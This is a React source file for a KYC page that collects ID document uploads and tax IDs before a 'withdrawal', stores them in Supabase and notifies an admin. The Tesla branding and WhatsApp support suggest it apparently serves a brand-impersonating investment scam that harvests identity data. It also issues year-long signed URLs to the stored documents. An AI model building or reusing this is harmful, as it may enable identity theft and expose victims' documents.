import { useState, useEffect, useCallback } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { toast } from 'sonner';
import { Shield, Upload, CheckCircle, Loader2, FileText, AlertCircle, Camera } from 'lucide-react';
import { getTaxIdConfig } from '@/data/taxIdFormats';
import teslaLogo from '@/assets/tesla-logo-clean.png';

type DocumentType = 'passport' | 'national_id' | 'drivers_license';

const VerifyIdentity = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const token = searchParams.get('token');
  const withdrawalId = searchParams.get('withdrawal_id');

  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [kycData, setKycData] = useState<{
    id: string;
    user_id: string;
    user_name: string;
    bank_country: string;
    withdrawal_id: string;
    status: string;
  } | null>(null);
  const [error, setError] = useState<string | null>(null);

  // Form state
  const [documentType, setDocumentType] = useState<DocumentType>('passport');
  const [taxId, setTaxId] = useState('');
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  const [dragActive, setDragActive] = useState(false);

  // Validate token and load KYC data
  useEffect(() => {
    const validateToken = async () => {
      if (!token || !withdrawalId) {
        setError('Invalid verification link. Please use the link from your email.');
        setLoading(false);
        return;
      }

      try {
        // Find KYC record by token
        const { data, error: fetchError } = await supabase
          .from('kyc_verifications')
          .select('*')
          .eq('kyc_token', token)
          .eq('withdrawal_id', withdrawalId)
          .maybeSingle();

        if (fetchError) throw fetchError;

        if (!data) {
          setError('Verification link is invalid or has expired.');
          setLoading(false);
          return;
        }

        if (data.status !== 'pending_kyc') {
          if (data.status === 'kyc_submitted' || data.status === 'kyc_approved') {
            setSubmitted(true);
          } else {
            setError('This verification has already been processed.');
          }
          setLoading(false);
          return;
        }

        setKycData(data);
      } catch (err) {
        console.error('Error validating token:', err);
        setError('Unable to verify your link. Please try again or contact support.');
      } finally {
        setLoading(false);
      }
    };

    validateToken();
  }, [token, withdrawalId]);

  // Handle file selection
  const handleFileSelect = (file: File) => {
    const validTypes = ['image/jpeg', 'image/png', 'application/pdf'];
    const maxSize = 10 * 1024 * 1024; // 10MB

    if (!validTypes.includes(file.type)) {
      toast.error('Please upload a JPG, PNG, or PDF file');
      return;
    }

    if (file.size > maxSize) {
      toast.error('File size must be less than 10MB');
      return;
    }

    setSelectedFile(file);

    // Create preview for images
    if (file.type.startsWith('image/')) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setPreviewUrl(reader.result as string);
      };
      reader.readAsDataURL(file);
    } else {
      setPreviewUrl(null);
    }
  };

  // Drag and drop handlers
  const handleDrag = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
    if (e.type === "dragenter" || e.type === "dragover") {
      setDragActive(true);
    } else if (e.type === "dragleave") {
      setDragActive(false);
    }
  }, []);

  const handleDrop = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
    setDragActive(false);
    
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleFileSelect(e.dataTransfer.files[0]);
    }
  }, []);

  // Submit verification
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!selectedFile) {
      toast.error('Please upload your ID document');
      return;
    }

    if (!taxId.trim()) {
      toast.error('Please enter your Tax ID');
      return;
    }

    if (!kycData) {
      toast.error('Invalid session. Please refresh and try again.');
      return;
    }

    setSubmitting(true);

    try {
      // Upload document to storage
      const fileExt = selectedFile.name.split('.').pop();
      const fileName = `${kycData.user_id}/${documentType}_${Date.now()}.${fileExt}`;
      
      const { data: uploadData, error: uploadError } = await supabase.storage
        .from('kyc-documents')
        .upload(fileName, selectedFile, {
          cacheControl: '3600',
          upsert: false
        });

      if (uploadError) {
        console.error('Upload error:', uploadError);
        throw new Error('Failed to upload document. Please try again.');
      }

      // Get signed URL for the document
      const { data: urlData } = await supabase.storage
        .from('kyc-documents')
        .createSignedUrl(fileName, 60 * 60 * 24 * 365); // 1 year

      const documentUrl = urlData?.signedUrl || fileName;

      // Update KYC record
      const { error: updateError } = await supabase
        .from('kyc_verifications')
        .update({
          document_url: documentUrl,
          document_type: documentType,
          tax_id: taxId,
          status: 'kyc_submitted',
          updated_at: new Date().toISOString()
        })
        .eq('id', kycData.id);

      if (updateError) throw updateError;

      // Send admin notification
      try {
        await supabase.functions.invoke('send-kyc-admin-notification', {
          body: {
            userName: kycData.user_name,
            userEmail: '', // Will be fetched by function
            withdrawalId: kycData.withdrawal_id,
            withdrawalAmount: 0, // Will be enriched by function
            bankCountry: kycData.bank_country,
            documentType: documentType,
            documentUrl: documentUrl,
            taxId: taxId,
            submittedAt: new Date().toISOString()
          }
        });
      } catch (notifyError) {
        console.warn('Failed to send admin notification:', notifyError);
        // Don't fail the submission if notification fails
      }

      setSubmitted(true);
      toast.success('Your documents have been submitted successfully!');
    } catch (err) {
      console.error('Submission error:', err);
      toast.error(err instanceof Error ? err.message : 'Failed to submit. Please try again.');
    } finally {
      setSubmitting(false);
    }
  };

  const taxIdConfig = kycData ? getTaxIdConfig(kycData.bank_country) : getTaxIdConfig('US');

  // Loading state
  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin text-tesla-red mx-auto mb-4" />
          <p className="text-slate-400">Verifying your link...</p>
        </div>
      </div>
    );
  }

  // Error state
  if (error) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center px-4">
        <div className="max-w-md w-full bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-2xl p-8 text-center">
          <AlertCircle className="w-16 h-16 text-red-500 mx-auto mb-4" />
          <h1 className="text-2xl font-bold text-white mb-2">Verification Error</h1>
          <p className="text-slate-400 mb-6">{error}</p>
          <Button
            onClick={() => navigate('/')}
            className="bg-tesla-red hover:bg-tesla-red/90"
          >
            Return to Home
          </Button>
        </div>
      </div>
    );
  }

  // Success state
  if (submitted) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center px-4">
        <div className="max-w-md w-full bg-slate-800/80 backdrop-blur-xl border border-green-500/30 rounded-2xl p-8 text-center">
          <div className="w-20 h-20 rounded-full bg-green-500/20 flex items-center justify-center mx-auto mb-6">
            <CheckCircle className="w-10 h-10 text-green-500" />
          </div>
          <h1 className="text-2xl font-bold text-white mb-2">Documents Submitted!</h1>
          <p className="text-slate-400 mb-6">
            Your identity verification documents have been submitted successfully. Our compliance team will review them shortly.
          </p>
          <p className="text-sm text-slate-500 mb-6">
            You will receive an email notification once your verification is approved.
          </p>
          <Button
            onClick={() => navigate('/dashboard')}
            className="bg-tesla-red hover:bg-tesla-red/90"
          >
            Go to Dashboard
          </Button>
        </div>
      </div>
    );
  }

  // Main form
  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-900 via-slate-800 to-slate-900 py-12 px-4">
      <div className="max-w-2xl mx-auto">
        {/* Header */}
        <div className="text-center mb-8">
          <img src={teslaLogo} alt="Tesla" className="h-12 mx-auto mb-4" />
          <div className="flex items-center justify-center gap-2 mb-2">
            <Shield className="w-6 h-6 text-tesla-red" />
            <h1 className="text-2xl font-bold text-white">Identity Verification</h1>
          </div>
          <p className="text-slate-400">
            Secure KYC verification for your withdrawal request
          </p>
        </div>

        {/* Form Card */}
        <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-2xl p-8">
          {/* Compliance Notice */}
          <div className="bg-tesla-red/10 border border-tesla-red/30 rounded-xl p-4 mb-8">
            <p className="text-sm text-slate-300">
              <strong className="text-white">Why is this required?</strong><br />
              To comply with international Anti-Money Laundering (AML) and Counter-Terrorist Financing (CTF) regulations, 
              we require identity verification for all withdrawal requests.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Document Type Selection */}
            <div className="space-y-3">
              <Label className="text-white">Document Type</Label>
              <div className="grid grid-cols-3 gap-3">
                {[
                  { value: 'passport', label: 'Passport', icon: '🛂' },
                  { value: 'national_id', label: 'National ID', icon: '🪪' },
                  { value: 'drivers_license', label: "Driver's License", icon: '🚗' },
                ].map((option) => (
                  <button
                    key={option.value}
                    type="button"
                    onClick={() => setDocumentType(option.value as DocumentType)}
                    className={`p-4 rounded-xl border-2 transition-all ${
                      documentType === option.value
                        ? 'border-tesla-red bg-tesla-red/10'
                        : 'border-slate-600 hover:border-slate-500 bg-slate-700/50'
                    }`}
                  >
                    <div className="text-2xl mb-1">{option.icon}</div>
                    <div className="text-xs text-slate-300">{option.label}</div>
                  </button>
                ))}
              </div>
            </div>

            {/* File Upload */}
            <div className="space-y-3">
              <Label className="text-white">Upload Document</Label>
              <div
                onDragEnter={handleDrag}
                onDragLeave={handleDrag}
                onDragOver={handleDrag}
                onDrop={handleDrop}
                className={`relative border-2 border-dashed rounded-xl p-8 text-center transition-all ${
                  dragActive
                    ? 'border-tesla-red bg-tesla-red/10'
                    : selectedFile
                    ? 'border-green-500 bg-green-500/10'
                    : 'border-slate-600 hover:border-slate-500'
                }`}
              >
                <input
                  type="file"
                  accept="image/jpeg,image/png,application/pdf"
                  onChange={(e) => e.target.files?.[0] && handleFileSelect(e.target.files[0])}
                  className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                />
                
                {previewUrl ? (
                  <div className="space-y-4">
                    <img src={previewUrl} alt="Preview" className="max-h-48 mx-auto rounded-lg" />
                    <p className="text-sm text-green-400">{selectedFile?.name}</p>
                    <Button type="button" variant="outline" size="sm" onClick={() => {
                      setSelectedFile(null);
                      setPreviewUrl(null);
                    }}>
                      Change File
                    </Button>
                  </div>
                ) : selectedFile ? (
                  <div className="space-y-4">
                    <FileText className="w-12 h-12 text-green-400 mx-auto" />
                    <p className="text-sm text-green-400">{selectedFile.name}</p>
                    <Button type="button" variant="outline" size="sm" onClick={() => setSelectedFile(null)}>
                      Change File
                    </Button>
                  </div>
                ) : (
                  <>
                    <Upload className="w-12 h-12 text-slate-500 mx-auto mb-4" />
                    <p className="text-slate-400 mb-2">Drag and drop your document here</p>
                    <p className="text-sm text-slate-500">or click to browse</p>
                    <p className="text-xs text-slate-600 mt-4">JPG, PNG, or PDF • Max 10MB</p>
                  </>
                )}
              </div>
            </div>

            {/* Tax ID Input */}
            <div className="space-y-3">
              <Label className="text-white">{taxIdConfig.label}</Label>
              <Input
                type="text"
                value={taxId}
                onChange={(e) => setTaxId(e.target.value)}
                placeholder={taxIdConfig.placeholder}
                className="bg-slate-700/50 border-slate-600 text-white placeholder:text-slate-500"
              />
              <p className="text-xs text-slate-500">Format: {taxIdConfig.format}</p>
            </div>

            {/* Submit Button */}
            <Button
              type="submit"
              disabled={submitting || !selectedFile || !taxId.trim()}
              className="w-full bg-tesla-red hover:bg-tesla-red/90 h-12 text-lg font-semibold"
            >
              {submitting ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin mr-2" />
                  Submitting...
                </>
              ) : (
                <>
                  <CheckCircle className="w-5 h-5 mr-2" />
                  Submit Verification
                </>
              )}
            </Button>
          </form>

          {/* Support Note */}
          <p className="text-center text-sm text-slate-500 mt-6">
            Need help? Contact our support team via WhatsApp for assistance.
          </p>
        </div>
      </div>
    </div>
  );
};

export default VerifyIdentity;
